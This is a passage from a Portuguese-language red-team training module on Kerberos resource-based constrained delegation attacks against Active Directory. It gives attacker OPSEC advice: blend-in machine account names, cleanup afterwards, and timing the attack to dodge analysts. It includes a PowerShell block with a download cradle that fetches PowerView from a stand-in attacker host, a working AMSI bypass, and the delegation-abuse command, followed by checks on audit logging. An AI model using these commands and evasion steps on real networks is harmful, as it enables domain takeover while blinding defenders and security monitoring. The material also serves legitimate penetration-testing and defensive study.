1. Criar machine account com nome que pareça legítimo (ex: WEBSRV02, APPSRV03)
   -- Evitar nomes óbvios como ATTACKER, HACK, EVIL --
2. Usar senha forte na machine account criada (não "Password123")
3. Após ataque: limpar msDS-AllowedToActOnBehalfOfOtherIdentity e remover machine account
4. Tempo total do ataque: pode ser executado em <5 minutos se automatizado
5. Executar fora de horário de pico para reduzir chance de analista ver alerta em tempo real
```

**Evasão de EDR durante RBCD:**
```powershell
# Evitar PowerView em disco — carregar via download cradle
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')

# AMSI bypass antes de carregar scripts de pentest
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Ou usar módulo AD nativo (menos suspeito que PowerView)
Import-Module ActiveDirectory
Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount (Get-ADComputer ATTACKERPC)
```

**Evasão de logging de evento 5136:**
- Evento 5136 requer que "Directory Service Changes" esteja habilitado na auditoria do DC
- Verificar antes: `AuditPol /get /subcategory:"Directory Service Changes"`
- Se não habilitado: evento não é gerado — RBCD passa sem log
- Ambientes maduros habilitam isso — assumir que está habilitado

---

## Módulos Relacionados

`05_delegacao_unconstrained.md` cobre Unconstrained Delegation — mais simples quando disponível, mas mais barulhento. `07_forest_e_domain_trusts.md` aprofunda CD com SPN cross-forest. `08_bloodhound_e_enumeracao.md` identifica automaticamente paths de CD e RBCD. `09_dacl_attacks.md` cobre o pré-requisito primário do RBCD (GenericWrite). `02_kerberoasting_e_asrep.md` é relevante porque service accounts com CD frequentemente têm SPNs roasteáveis.

### Ferramentas Relevantes

| Ferramenta | Uso | Plataforma |
|---|---|---|
| Rubeus s4u | S4U2Self + S4U2Proxy attack | Windows |
| Impacket getST | S4U completo via Python | Linux |
| Impacket rbcd.py | Configurar RBCD via LDAP | Linux |
| PowerView Set-DomainObject | Configurar RBCD via PowerShell | Windows |
| PowerMad New-MachineAccount | Criar machine account | Windows |
| Impacket addcomputer.py | Criar machine account via Python | Linux |
| BloodHound | Encontrar paths com CD/RBCD | Multiplataforma |

### Referências Externas

- Elad Shamir — "Wagging the Dog: Abusing Resource-Based Constrained Delegation" (2019)
- [MS-SFU] — Kerberos Protocol Extensions: Service for User and Constrained Delegation Protocol
- Will Schroeder (@harmj0y) — "A Case Study in Wagging the Dog: Computer Takeover" 
- Charlie Clark (@exploitph) — S4U2Proxy research
- Charlie Bromberg — "RBCD Everywhere" 
- Sean Metcalf (adsecurity.org) — "Kerberos Delegation, SPNs and More"
- Lee Christensen / Will Schroeder / Matt Nelson — "An Ace Up the Sleeve" (ACL abuses)
